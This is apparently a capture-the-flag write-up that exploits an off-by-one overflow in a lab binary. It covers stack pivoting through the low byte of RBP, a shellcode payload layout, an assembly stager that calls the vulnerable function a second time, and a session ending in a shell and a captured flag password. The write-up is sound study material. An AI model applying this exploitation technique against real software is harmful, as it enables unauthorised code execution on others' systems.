This was a tricky challenge where we had to try several approaches, including attempting a ROP chain on the stack and on the `.bss` section.

Looking at the code, we found an off-by-one overflow in the `store_record` function that overwrites the lower byte of `RBP`, letting us offset `RBP` between `[baseAddress][0x00, 0xff]`. Controlling only the lower byte of `RBP` does not immediately overwrite `RIP`, but once the caller (`main`) executes `leave; ret`, it allows us to indirectly control `RIP`.

The `leave` instruction executes:

```asm
mov rsp, rbp ; 1
pop rbp      ; 2

```

This sets the stack pointer to the value of the base pointer, pops the value at the top of the stack into `RBP`, and finally the subsequent `ret` instruction pops the next value into `RIP`. Controlling the lower byte of `RBP` therefore controls where `RSP` points, letting us control where the program jumps.

Our initial payload layout was:

```python
obb = b'\x60' # Controlled byte of RBP
payload = rip_address + shellcode
payload += b'\x90' * (offset - len(payload)) + obb

```

However, the exploit does not run until the `main` function returns. Any operations executing in the meantime on top of our controlled stack area corrupt the payload. In our case, the `record_dump` function corrupted the buffer, leaving only 32 uncorrupted bytes—not enough space for a full shellcode to spawn `/bin/sh`.

To solve this, we used the available space to call the vulnerable `store_record` function a second time. This minimal stager fits in the remaining space and allows us to send a second, clean payload that will not be corrupted by prior operations.

Using GDB, we found the address of `store_record` (`0x4013d2`) and the buffer addresses. We used the following assembly to call the function with respect to the prologue, maintaining stack alignment:

```asm
push rbp
mov rbp, rsp
mov rax, 0x4013d2
call rax
leave
ret

```

Running the exploit in `exploit.py`:

```bash
level02@rainfall:~$ env -i bash -c "(cat in.bin; cat) | /home/level02/dixie"
  [FLATLINE] The Dixie Flatline lives again.
  [FLATLINE] ROM construct v3.0 — memory interface ready.
[FLATLINE] Ready: [FLATLINE] Record 0 stored. Checksum: a3d725fe
[FLATLINE] Record 0: h (checksum: a3d725fe)
  [FLATLINE]  session closed.
[FLATLINE] Ready: [FLATLINE] Record 1 stored. Checksum: 6799d11c
ls
README  dixie  dixie.c  exploit.py  in.bin
whoami
flag02
cat /home/flag02/.pass
qeplvibynup98phqb312dkvhtpdkklac

```